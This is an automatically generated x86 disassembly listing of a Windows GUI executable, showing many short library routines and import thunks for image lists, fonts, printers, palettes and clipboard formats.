mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0f0
retn
sub_41cc98
jmp sub_40387c
sub_41cd11
jmp sub_40387c
sub_41cd18
pop ebx
pop ecx
pop ebp
retn
sub_41ce49
jmp sub_40387c
sub_41ce5c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d194
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41d364
jmp sub_40387c
sub_41d36b
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41d374
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41d3ac
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d3b8
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d51c
retn
sub_41d5e5
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41d5fc
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41d6e8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d708
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d728
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d748
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
pop ebx
retn
sub_41d760
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
pop ebx
retn
sub_41d784
mov eax [ rw-data ]
call sub_41d760
retn
sub_41d7e6
jmp sub_40387c
sub_41d7ed
pop ecx
pop ebp
retn
sub_41d88c
jmp sub_40387c
sub_41d893
pop ebx
mov esp ebp
pop ebp
retn
sub_41d965
jmp sub_40387c
sub_41d9f6
jmp sub_40387c
sub_41d9fd
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41da28
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41db0f
jmp sub_40387c
sub_41dcbc
jmp sub_40387c
sub_41dcc3
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41ded5
jmp sub_40387c
sub_41dedc
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41df76
jmp sub_40387c
sub_41e152
jmp sub_40387c
sub_41e20c
jmp sub_40387c
sub_41e213
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e233
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e22c
jmp sub_40387c
sub_41e233
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41e3c1
jmp sub_40387c
sub_41e58c
jmp sub_40387c
sub_41e593
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5b6
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026dc
retn
sub_41e5af
jmp sub_40387c
sub_41e5b6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5d6
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
sub_41e5cf
jmp sub_40387c
sub_41e5d6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41e5e0
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_41e740
push 0x0
call sub_41e6dc
retn
sub_41e7e5
jmp sub_40387c
sub_41e7ec
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41e7f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41e748
pop ebx
pop ebp
retn 0x4
sub_41e80c
retn
sub_41e810
test eax eax
jne r-xdata
retn
call sub_41e80c
sub_41e9e3
jmp sub_40387c
sub_41ea0a
jmp sub_40387c
sub_41ea11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ea50
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41ec1d
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_41ec26
jmp sub_40387c
j_sub_41ec1d
jmp sub_41ec1d
sub_41ec2d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_41ec43
jmp sub_40387c
sub_41ec54
xor eax eax
retn
sub_41ec58
mov al [ eax + 0x21 ]
retn
sub_41eca4
jmp sub_40387c
sub_41ecab
pop esi
pop ecx
pop ebp
retn
sub_41ecd8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41ed2f
jmp sub_40387c
sub_41ed36
pop esi
pop ecx
pop ebp
retn
sub_41ed3c
retn
sub_41ed40
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41ed50
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41edda
jmp sub_40387c
sub_41ede1
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ef3c
jmp sub_4035c8
sub_41ef9c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ee4c
mov [ rw-data ] eax
sub_41f084
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_41f020
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_41f12c
jmp sub_4035c8
sub_41f1c3
jmp sub_4035c8
sub_41f23c
push ebx
mov ebx edx
call sub_41ef9c
mov edx ebx
call sub_41ef60
test eax eax
setne al
pop ebx
retn
sub_41f254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41f084
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_41f26c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41f084
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_41f3b5
jmp sub_4035c8
sub_41f433
jmp sub_40387c
sub_41f43a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f5a4
retn
sub_41f744
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_41fa48
jmp sub_40387c
sub_41fa4f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fbc7
jmp sub_40387c
sub_41fbce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fc5d
jmp sub_40387c
sub_41fc64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc86
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e9c
retn
sub_41fc7f
jmp sub_40387c
sub_41fc86
pop ebx
mov esp ebp
pop ebp
retn
sub_41fc99
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_41ff80
jmp r-xdata
retn
sub_41fcaf
call sub_42000c
retn
sub_41fda4
retn
sub_41fffc
jmp sub_40387c
sub_420127
jmp sub_40387c
sub_42012e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_420147
jmp sub_40387c
sub_42031e
jmp sub_40387c
sub_420346
jmp sub_40387c
sub_42034d
mov esp ebp
pop ebp
retn
sub_4203c4
jmp sub_40387c
sub_4204cc
jmp sub_40387c
sub_4205b7
jmp sub_40387c
sub_4205c4
inc [ eax + 0x4 ]
retn
sub_42073f
jmp sub_40387c
sub_420af0
jmp sub_40387c
sub_420d3a
jmp sub_40387c
sub_420d64
jmp sub_40387c
sub_420d6b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d8d
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_420d86
jmp sub_40387c
sub_420d97
jmp sub_4035c8
sub_420de6
jmp sub_40387c
sub_421013
jmp sub_40387c
sub_42105b
jmp sub_40387c
sub_4211c8
jmp sub_40387c
sub_42128f
jmp sub_4035c8
sub_4212e4
mov [ eax + 0x31 ] 0x0
call sub_41ea50
retn
sub_421535
jmp sub_40387c
sub_4215a0
jmp sub_40387c
sub_4215a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421618
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_4216cc
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_4216dc
push ebx
mov ebx eax
mov eax ebx
call sub_421894
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_4216f0
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42170c
push ebx
mov ebx eax
mov eax ebx
call sub_4218f4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_421768
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_421877
jmp sub_40387c
sub_421adb
jmp sub_4035c8
sub_421b3b
jmp sub_40387c
sub_421b42
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_421f23
jmp sub_40387c
sub_421f4f
jmp sub_40387c
sub_421fb6
jmp sub_4035c8
sub_421fe7
jmp sub_40387c
sub_42206c
jmp sub_4035c8
sub_422071
mov eax [ ebp - 0x38 ]
call sub_403128
call sub_4038dc
call sub_403930
sub_422083
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4220a0
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
sub_422099
jmp sub_40387c
sub_4221ef
jmp sub_4035c8
sub_4224bb
jmp sub_4035c8
sub_42259c
mov cl 0x1
call sub_4225a4
retn
sub_422859
add [ eax ] al
add [ ebx ] dh
leave
call sub_4225a4
retn
sub_4228de
jmp sub_4035c8
sub_4228e3
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4038dc
call sub_403930
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422934
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_422a6d
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_422a9c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_422ab0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_422bc9
jmp sub_4035c8
sub_422c7e
jmp sub_4035c8
sub_422ce8
jmp sub_4035c8
sub_422d1c
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_422ca8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_422d34
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d748
retn
mov [ eax + 0x30 ] edx
retn
sub_422d4c
retn
sub_422d50
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d748
retn
mov [ eax + 0x2c ] edx
retn
sub_422d90
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d748
pop ebp
retn 0x4
sub_422da4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d748
pop ebp
retn 0x4
sub_422f64
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422f70
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42301d
jmp sub_40387c
sub_423024
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42310f
jmp sub_4035c8
sub_42317b
jmp sub_40387c
sub_4232a9
jmp sub_40387c
sub_4232b0
pop ebp
retn
sub_4233e5
jmp sub_40387c
sub_4233ec
pop ebp
retn
sub_4233f0
sub [ rw-data ] 0x1
retn
sub_423638
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4138b8
retn
sub_42366c
mov eax [ eax + 0x4 ]
call sub_41375c
retn
sub_42369d
jmp sub_40387c
sub_4236a4
pop ebp
retn
sub_4236a8
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_423799
jmp sub_40387c
sub_4237a0
pop ebp
retn
sub_4237a4
sub [ rw-data ] 0x1
retn
sub_42386b
jmp sub_40387c
sub_423872
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423e88
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_423894
mov [ rw-data ] sub_4239ac
mov [ rw-data ] sub_42391c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_423bb0
mov [ rw-data ] sub_423c84
mov [ rw-data ] sub_423d58
retn
sub_423f19
jmp sub_40387c
sub_423f20
pop ebp
retn
sub_423f24
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423e88
sub_423f59
jmp sub_40387c
sub_423f60
pop ebp
retn
sub_423f64
sub [ rw-data ] 0x1
retn
sub_4241a5
add eax 0xffffffd8
jmp sub_424e28
sub_4241ad
add eax 0xffffffd8
jmp sub_424e3c
sub_4241bf
add [ esp + 0x4 ] 0xffffffd8
jmp sub_405588
sub_4241c9
add [ esp + 0x4 ] 0xffffffd8
jmp sub_40559c
sub_4241d3
add eax 0xffffffd4
jmp sub_4248f4
sub_4241db
add eax 0xffffffd4
jmp sub_424b08
sub_4241e3
add eax 0xffffffd4
jmp sub_424c1c
sub_4241f3
add eax 0xffffffd4
jmp sub_424d20
sub_4241fb
add eax 0xffffffd4
jmp sub_424d7c
sub_42420d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405588
sub_424217
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40559c
sub_4243a6
jmp sub_40387c
sub_4243ad
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4245bd
jmp sub_40387c
sub_4245c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424779
jmp sub_40387c
sub_4247de
jmp sub_40387c
sub_4247e5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4248d1
jmp sub_40387c
sub_4248d8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_424ae8
lea eax [ ebp - 0x30 ]
call sub_403e78
lea eax [ ebp - 0x20 ]
call sub_403e78
retn
sub_424af9
jmp sub_40387c
j_sub_424ae8
jmp sub_424ae8
sub_424b00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424bfb
jmp sub_40387c
sub_424c02
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424c1c
call sub_42464c
retn
sub_424cff
jmp sub_40387c
sub_424d06
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424d66
lea eax [ ebp - 0x4 ]
call sub_4054b4
retn
sub_424d6f
jmp sub_40387c
j_sub_424d66
jmp sub_424d66
sub_424d76
pop ebx
pop ecx
pop ebp
retn
sub_424e11
jmp sub_40387c
sub_424e18
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_424e24
mov eax [ eax + 0x20 ]
retn
sub_424e28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_403ecc
pop esi
pop ebx
retn
sub_424f53
jmp sub_40387c
sub_424f5a
pop ebp
retn
sub_424f5c
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_13(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_424fa9
jmp sub_40387c
sub_424fb0
pop ebp
retn
sub_424fb4
sub [ rw-data ] 0x1
retn
sub_42521b
jmp sub_40387c
sub_425222
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_425402
jmp sub_40387c
sub_425409
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425475
jmp sub_40387c
sub_42547c
pop ecx
pop ecx
pop ebp
retn
sub_425727
jmp sub_40387c
sub_42572e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425738
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4252e4
mov eax [ ebx + 0x20 ]
pop ebx
retn
sub_42574c
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_4259a4
sub_42593f
jmp sub_40387c
sub_425950
jmp sub_4035c8
sub_425993
jmp sub_40387c
sub_42599a
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425b41
jmp sub_40387c
sub_425b81
jmp sub_40387c
sub_425b88
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425be0
add eax 0x8
call sub_40cc70
retn
sub_425bec
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42522c
mov [ rw-data ] eax
sub_425c3d
jmp sub_40387c
sub_425c44
pop ebp
retn
sub_425c48
sub [ rw-data ] 0x1
retn
sub_425f55
jmp sub_40387c
sub_425f5c
pop ebp
retn
sub_425f60
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425cac
sub_426040
retn
sub_4260b4
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_4260c0
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_4260cc
mov edx [ eax ]
call [ edx ]
retn
sub_4260d4
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_426101
jmp sub_40387c
sub_426108
pop ebp
retn
sub_42610c
sub [ rw-data ] 0x1
retn
sub_4262cb
jmp sub_40387c
sub_4262d2
pop ebp
retn
sub_426687
jmp sub_40387c
sub_42668e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_426aa8
jmp sub_40387c
sub_426aaf
pop ebp
retn
sub_426ab4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426044
mov [ rw-data ] eax
sub_426af5
jmp sub_40387c
sub_426afc
pop ebp
retn
sub_426b00
sub [ rw-data ] 0x1
retn
sub_426b2d
jmp sub_40387c
sub_426b34
pop ebp
retn
sub_426b38
sub [ rw-data ] 0x1
retn
sub_426b65
jmp sub_40387c
sub_426b6c
pop ebp
retn
sub_426b70
sub [ rw-data ] 0x1
retn
sub_426b9d
jmp sub_40387c
sub_426ba4
pop ebp
retn
sub_426ba8
sub [ rw-data ] 0x1
retn
sub_426bd5
jmp sub_40387c
sub_426bdc
pop ebp
retn
sub_426be0
sub [ rw-data ] 0x1
retn
sub_426c0d
jmp sub_40387c
sub_426c14
pop ebp
retn
sub_426c18
sub [ rw-data ] 0x1
retn
sub_426c45
jmp sub_40387c
sub_426c4c
pop ebp
retn
sub_426c50
sub [ rw-data ] 0x1
retn
ChooseFontA
jmp [ ChooseFontA@IAT ]
sub_426c85
jmp sub_40387c
sub_426c8c
pop ebp
retn
sub_426c90
sub [ rw-data ] 0x1
retn
sub_426cbd
jmp sub_40387c
sub_426cc4
pop ebp
retn
sub_426cc8
sub [ rw-data ] 0x1
retn
sub_42739a
jmp sub_4035c8
sub_42739f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_455598
call sub_403930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4273bc
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_4273c4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403324
pop esi
retn
sub_4273dc
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403324
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4273f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42749d
jmp sub_40387c
sub_4274cb
jmp sub_40387c
sub_4274d2
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4274dc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4274f0
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_427600
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_4276a3
jmp sub_4035c8
sub_42785d
jmp sub_40387c
sub_427864
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427870
push esi
mov esi eax
mov eax [ esi + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42791d
jmp sub_40387c
sub_427924
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427b7a
jmp sub_40387c
sub_427b81
pop ebp
retn
sub_428176
jmp sub_4035c8
sub_42822f
jmp sub_40387c
sub_428236
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42823c
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4281b0
sub_42824c
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_4281b0
sub_42825c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_4281b0
pop ebp
retn 0x8
sub_428274
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4289b3
jmp sub_40387c
sub_428a20
jmp sub_40387c
sub_428b3c
push ebx
lea ebx [ eax + 0x190 ]
push ebx
lea ebx [ eax + 0x1ac ]
push ebx
call sub_428a68
pop ebx
retn
sub_428c88
mov [ eax + 0x16d ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_429099
jmp sub_40387c
sub_4290a0
pop ebp
retn
sub_4290a4
sub [ rw-data ] 0x1
retn
sub_42917c
jmp sub_40387c
sub_429188
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_4292be
jmp sub_40387c
sub_4292c5
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42936e
jmp sub_40387c
sub_4293d4
jmp sub_40387c
sub_4293db
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429439
jmp sub_40387c
sub_429440
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429525
jmp sub_40387c
sub_42952c
pop ebx
mov esp ebp
pop ebp
retn
sub_4295a9
jmp sub_40387c
sub_4295b0
pop ebx
mov esp ebp
pop ebp
retn
sub_42964e
jmp sub_4035c8
sub_4296e5
jmp sub_40387c
sub_4296ec
pop ebp
retn
sub_4296f0
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42976c
retn
sub_42976d
jmp sub_40387c
j_sub_42976c
jmp sub_42976c
sub_429774
pop ebp
retn
sub_429778
sub [ rw-data ] 0x1
retn
sub_4299d4
jmp r-xdata
jmp [ eax ]
sub_42a1c0
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_42a943
jmp sub_40387c
sub_42a97f
jmp sub_40387c
sub_42b58a
jmp sub_40387c
sub_42b591
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b818
call sub_4360e4
retn
sub_42b820
push ebx
mov ebx eax
mov eax ebx
call sub_42b83c
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_42b834
mov eax [ r-xdata ]
retn
sub_42b83c
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_42b848
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_42a330
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_42b860
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_42b898
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42b948
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b964
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_42b8a0
sub_42b978
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b994
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
